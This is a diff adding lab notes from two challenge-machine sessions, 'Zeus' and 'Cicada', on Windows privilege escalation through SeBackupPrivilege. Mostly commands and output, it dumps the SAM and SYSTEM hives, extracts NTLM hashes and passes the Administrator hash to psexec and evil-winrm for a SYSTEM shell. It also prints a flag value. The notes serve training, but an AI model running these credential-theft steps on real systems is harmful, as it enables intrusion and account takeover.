@@ -1,0 +1,114 @@
+# Example1
+*Notes from the Challenge Lab's “Zeus” session*
+https://www.bordergate.co.uk/backup-operator-privilege-escalation/
+```powershell
+*Evil-WinRM* PS C:\Users\d.chambers\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeBackupPrivilege             Back up files and directories  Enabled
+```
+# copy SAM
+```powershell
+*Evil-WinRM* PS C:\Users\d.chambers\Documents> reg save hklm\sam c:\Windows\Tasks\SAM
+The operation completed successfully.
+```
+# copy SYSTEM
+```powershell
+*Evil-WinRM* PS C:\Users\d.chambers\Documents> reg save hklm\system c:\Windows\Tasks\SYSTEM
+The operation completed successfully.
+```
+
+# Download
+```powershell
+*Evil-WinRM* PS C:\Users\d.chambers\Documents> cd c:\windows\tasks
+*Evil-WinRM* PS C:\windows\tasks> dir
+
+    Directory: C:\windows\tasks
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/29/2025  10:36 AM          45056 SAM
+-a----        8/29/2025  10:36 AM       16740352 SYSTEM
+```
+
+# Crack
+```bash
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xf7d6d584287ffb4f29364a67bc20d85b
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:650836aac5e819c6afb991606f63f5c3:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Cleaning up... 
+```
+
+```zsh
+impacket-psexec -hashes :650836aac5e819c6afb991606f63f5c3 Administrator@192.168.148.158 powershell.exe
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 192.168.148.158.....
+[*] Found writable share ADMIN$
+[*] Uploading file hURCWoEF.exe
+[*] Opening SVCManager on 192.168.148.158.....
+[*] Creating service uuLV on 192.168.148.158.....
+[*] Starting service uuLV.....
+[!] Press help for extra shell commands
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+```
+
+```powershell
+PS C:\Windows\system32> 
+whoami      
+PS C:\Windows\system32> whoami
+nt authority\system
+hostname
+PS C:\Windows\system32> hostname
+DC01
+type \users\administrator\desktop\proof.txt
+PS C:\Windows\system32> type \users\administrator\desktop\proof.txt
+0583df80a70337b6912e87676a750288
+```
+
+---
+# Example2
+*Notes from the Challenge Lab's “Cicada” session*
+### 参考リンク
+- [解説](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
+- [Hack_The_Box-Cicada](https://medium.com/@aenoshrajora79/introduction-8bf57544b515)
+
+### 1 権限の確認  
+Evil-Winrmで接続後にカレントユーザの権限を確認
+```bash
+whoami /priv
+```
+
+### 2 ディレクトリの作成及SAMファイル、SYSTEMファイルの作成
+```bash
+cd c:\
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+```
+
+### 3 ファイルのダウンロード
+```bash
+download  sam
+download system
+```
+
+### 4 ハッシュの取得
+```bash
+pypykatz registry --sam sam system
+```
+
+### 5 ハッシュを利用したログイン
+```bash
+evil-winrm -i cicada.htb -u administrator -H "2b87e7c93a3e8a0ea4a581937016f341"
+```
